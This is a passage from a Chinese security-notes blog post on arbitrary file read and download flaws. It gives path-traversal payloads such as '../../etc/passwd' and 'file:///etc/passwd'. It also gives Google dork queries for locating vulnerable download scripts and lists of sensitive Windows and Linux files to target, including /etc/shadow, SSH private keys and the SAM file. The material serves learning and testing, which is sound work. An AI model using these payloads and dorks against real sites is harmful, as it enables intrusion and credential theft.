<p>读取文件的路径用户可控且未校验或校验不严<br>输出了文件内容<br><strong>漏洞类型：</strong><br>index.php?f&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
<p>index.php?f&#x3D;..&#x2F;index.php</p>
<p>index.php?f&#x3D;ﬁle:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>当参数 f 的参数值为php文件时，<br>若是文件被解析则是文件包含漏洞，若显示源码或提示下载则是文件查看与下载漏洞。</p>
<p><strong>漏洞挖掘：</strong><br>可以用Google hacking或Web漏洞扫描器</p>
<p>Google search利用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">inurl:&quot;readfile.php?file=&quot;</span><br><span class="line">inurl:&quot;read.php?filename=&quot;</span><br><span class="line">inurl:&quot;download.php?file=&quot;</span><br><span class="line">inurl:&quot;down.php?file=&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="常见的敏感信息路径："><a href="#常见的敏感信息路径：" class="headerlink" title="常见的敏感信息路径："></a>常见的敏感信息路径：</h5><p>Windows系统：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini //Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">C:\Windows\php.ini //php配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql配置信息</span><br></pre></td></tr></table></figure>

<p>Linux系统：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</span><br><span class="line">/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub</span><br><span class="line">/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥</span><br><span class="line">/root/.ssh/known_hosts</span><br><span class="line">//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</span><br><span class="line">/etc/passwd // 账户信息</span><br><span class="line">/etc/shadow // 账户密码文件</span><br><span class="line">/etc/my.cnf //mysql 配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line">/root/.bash_history //用户历史命令记录文件</span><br><span class="line">/root/.mysql_history //mysql历史命令记录文件</span><br><span class="line">/proc/self/fd/fd[0-9]*(文件标识符)</span><br><span class="line">/proc/mounts //记录系统挂载设备</span><br><span class="line">/porc/config.gz //内核配置文件</span><br><span class="line">/var/lib/mlocate/mlocate.db //全文件路径</span><br><span class="line">/porc/self/cmdline //当前进程的cmdline参数</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://lx3820.github.io">Wch</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://lx3820.github.io/2024/03/15/%E6%B8%97%E9%80%8F/">http://lx3820.github.io/2024/03/15/%E6%B8%97%E9%80%8F/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://lx3820.github.io" target="_blank">LX3820</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/1.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/24/%E9%9D%B6%E5%9C%BA/" title="靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">靶场</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/23/kali/" title="kali"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">kali</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/1.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Wch</div><div class="author-info__description">初来乍到 多多关照</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">sql 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#access%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9A"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">access数据库：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">MYSQL数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlserver%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">sqlserver数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">数据库文件读写</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">黑白名单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-MIME%EF%BC%88Content-Type%EF%BC%89"><span class="toc-number">3.0.0.2.</span> <span class="toc-text">3.1 MIME（Content Type）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache-HTTPD-%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.0.0.3.</span> <span class="toc-text">Apache HTTPD 多后缀解析漏洞</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xss"><span class="toc-number">4.</span> <span class="toc-text">xss</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-number">4.0.0.1.</span> <span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-finecms"><span class="toc-number">4.0.0.2.</span> <span class="toc-text">存储型(finecms)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM"><span class="toc-number">4.0.0.3.</span> <span class="toc-text">DOM</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">5.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81CSRF%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8A%E8%BF%87%E7%A8%8B"><span class="toc-number">5.1.</span> <span class="toc-text">二、CSRF攻击原理及过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xxe"><span class="toc-number">6.</span> <span class="toc-text">xxe</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">6.1.</span> <span class="toc-text">1、任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">6.1.1.</span> <span class="toc-text">有回显</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93"><span class="toc-number">6.1.1.1.</span> <span class="toc-text">恶意引入外部实体</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="toc-number">6.1.1.2.</span> <span class="toc-text">恶意引入外部参数实体</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">6.1.2.</span> <span class="toc-text">无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#OOB"><span class="toc-number">6.1.2.1.</span> <span class="toc-text">OOB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99"><span class="toc-number">6.1.2.2.</span> <span class="toc-text">基于报错</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%BC%95%E5%85%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6"><span class="toc-number">6.1.2.2.1.</span> <span class="toc-text">通过引入服务器文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">6.1.3.</span> <span class="toc-text">任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E8%B7%AF%E5%BE%84%EF%BC%9A"><span class="toc-number">6.1.3.0.1.</span> <span class="toc-text">常见的敏感信息路径：</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/24/%E9%9D%B6%E5%9C%BA/" title="靶场">靶场</a><time datetime="2024-04-24T07:17:39.000Z" title="发表于 2024-04-24 15:17:39">2024-04-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/15/%E6%B8%97%E9%80%8F/" title="渗透">渗透</a><time datetime="2024-03-15T00:28:01.000Z" title="发表于 2024-03-15 08:28:01">2024-03-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/23/kali/" title="kali">kali</a><time datetime="2023-11-23T03:27:46.000Z" title="发表于 2023-11-23 11:27:46">2023-11-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98/" title="攻防世界刷题">攻防世界刷题</a><time datetime="2023-09-06T11:23:12.000Z" title="发表于 2023-09-06 19:23:12">2023-09-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/06/01/buuctf%20web/" title="无题">无题</a><time datetime="2023-06-01T04:06:49.564Z" title="发表于 2023-06-01 12:06:49">2023-06-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Wch</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>